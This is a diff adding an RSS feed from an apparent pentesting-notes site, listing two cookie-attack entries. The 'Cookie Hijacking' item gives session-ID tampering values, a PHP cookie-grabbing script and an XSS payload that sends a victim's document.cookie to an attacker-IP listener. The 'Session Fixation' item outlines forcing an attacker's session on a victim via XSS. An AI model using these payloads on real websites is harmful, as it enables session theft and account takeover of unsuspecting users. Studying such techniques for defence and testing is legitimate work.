@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cookie on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/cookie/</link>
+    <description>Recent content in Cookie on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Fri, 21 Apr 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/cookie/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Cookie Hijacking</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</link>
+      <pubDate>Fri, 21 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/</guid>
+      <description>Cookie Manipulation link Cookie: PHPSESSID=0 Cookie: PHPSESSID=1 Cookie: PHPSESSID=999 &amp;lt;!-- ASCII Hex --&amp;gt; Cookie: PHPSESSID=3836382d61646d696e PHP Cookie Grabbing with XSS linkIn your local machine, create the payload for grabbing the cookie when the other user will access your machine.&#xA;// steal_cookie.php &amp;lt;?php echo $_GET[&amp;#39;cookie&amp;#39;]; ?&amp;gt; Create the JavaScript code to force users to access your machine which shows the victim&amp;rsquo;s cookie value.&#xA;&amp;lt;script&amp;gt;document.location = &amp;#39;http://&amp;lt;attacker-ip&amp;gt;:4444/steal_cookie.php?cookie=&amp;#39;&amp;#43;document.cookie&amp;lt;/script&amp;gt; POST request with this JavaScript code to the target web page.</description>
+    </item>
+    <item>
+      <title>Session Fixation</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</link>
+      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</guid>
+      <description>Exploitation link1. Attacker Logins Website to Get the Session linkAn attacker need to login to a legitimate website then get the session value.&#xA;Cookie: sessid=abcdef 2. Attacker Sends the Session Value to Victim linkThere are various way to send the attacker’s session value. For example,&#xA;Send email.&#xA;Predict a session value.&#xA;Eavesdrop a session using packet sniffer such as Wireshark.&#xA;XSS&#xA;&amp;lt;script&amp;gt;document.cookie = ATTACKERS_SESSION_ID&amp;lt;/script&amp;gt; 3. Victim Logins with Attacker’s Session linkIf the victim logins and attacker’s session is set to the Cookie, the attacker can control the victim’s account in the website.</description>
+    </item>
+  </channel>
+</rss>
